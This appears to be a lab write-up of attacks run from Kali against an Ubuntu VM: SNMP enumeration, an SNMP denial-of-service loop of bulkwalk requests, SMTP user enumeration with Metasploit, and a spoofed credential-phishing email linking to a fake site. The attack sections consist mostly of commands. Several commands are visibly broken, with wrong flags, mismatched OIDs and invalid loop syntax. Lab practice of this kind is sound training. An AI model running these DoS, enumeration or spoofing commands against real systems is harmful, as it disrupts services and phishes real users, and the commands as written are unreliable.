## Attacks Performed
### 1. SNMP Enumeration
- Then, after it was done updating, I ran the sudo apt install vsftpd snmp postfix to install 3 packages: the vsftpd, because it supports anonymous/authenticated access, snmp for monitoring and managing network devices, and postfix, since it supports TLS encryption.	
sudo apt install vsftpd snmp postfix
- After I edited the configuration file for the SNMP service using the sudo nano /etc/snmp/snmpd.conf command.
sudo nano /etc/snmp/snmpd.conf
- After editing the configuration file, I restarted the SNMP to apply the settings using the sudo systemctl restart snmpd command.
sudo systemctl restart snmp
- Then I checked if the SNMP service was functional by using the sudo systemctl status snmpd command after editing the configuration file.
sudo systemctl status snmpd
- Then I installed the tool I will be using to perform the attack using the sudo apt install snmp -y
sudo apt install snmp -y
- Then I performed the SNMP enumeration using the snmpwalk -v2c -c public <target IP> <system info>, but for this demonstration, it is snmpwalk -v2v -c public 172.16.54.130 1.3.6.2.1.2.1.1
Snmpwalk -v2v -c public 172.16.54.130 1.3.6.2.1.1

### 2. SNMP DoS Attack
- I first changed the configuration of the rocommunity string in the snmp service using the sudo nano /etc/snmp/snmpd.conf.
sudo nano /etc/snmp/snmpd.conf
- Then I went on to use the inbuilt snmpbulk command on Kali. I triggered an infinite loop of bulkwalk requests to the target using the command while true: do 
snmpbulkwalk -v2c -c public 172.16.54.130: done, and each request triggers a large response from the SNMP agent on the system, causing cpu and usage to spike and sometimes causing a system to crash.
while true: do snmpbulkwalk -v2c -c public 172.16.54.130: done
- Using the top command on Ubuntu I was able to view the system cpu memory usage, showing the spike due to the attack performed on Kali.
top

### 3. SMTP Enumeration
- After turning on the server VM, I used the sudo apt install postfix command to download the postfix tool, which is used for sending and receiving mail.
sudo apt install postfix
- After I ran the sudo nano /etc/postfix/main.cf command to edit the configuration file of the Postfix tool to help in demonstrating the SMTP enumeration and SMTP spoofing.
sudo nano /etc/postfix/main.cf
- Then I ran the sudo systemctl restart command to apply all the changes I made.
"sudo systemctl restart postfix"
- Then I ran the sudo systemctl status postfix command to ensure that the tool was functioning properly.
"sudo systemctl status postfix"
- Then I created a new user using the sudo adduser <username> command.
sudo adduser <username>
- I used Metasploit on kali to carry out the SMTP enumeration using the following commands: use auxiliary/scanner/smtp/smtp_enum, followed by the set RHOSTS 
<target IP>, then followed by the run command. I got a list of possible users, and using that information, further attacks can be performed.

### 4. SMTP Spoofing
- Then I installed the tool I would use to perform the attack using the command sudo apt install sendmail libio-socket-ssl-perl libnet-ssleay-perl.
sudo apt install sendmail libio-socket-ssl-perl libnet-ssleay-perl
- Once the tool was successfully installed, I proceeded to perform the attack using the command sendmail -f fake@target.com -t user@lab.local -s 172.16.54.130 -u “Reset Requested” -m “ please verify your credentials at http://malivious.site -o tls = no.
sendmail -f fake@target.com -t user@lab.local -s 172.16.54.130 -u “Reset Requested” -m “ please verify your credentials at http://malivious.site -o tls = no
- After the attack is performed, you will see an email in the user’s mail and you can check it using the command sudo mail -u user 
